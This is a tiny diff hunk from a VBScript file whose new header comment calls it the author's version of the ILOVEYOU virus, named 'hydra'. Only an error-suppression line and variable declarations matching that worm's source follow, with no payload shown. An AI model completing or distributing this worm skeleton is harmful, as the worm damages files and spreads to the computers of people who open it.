@@ -1,4 +1,4 @@
-em  barok -hydra(vbe) <i hate go to school>
+rem this is my version of the ILOVEYOU virus name hydra
 On Error Resume Next
 
 Dim fso, dirsystem, dirwin, dirtemp, eq, ctr, file, vbscopy, dow
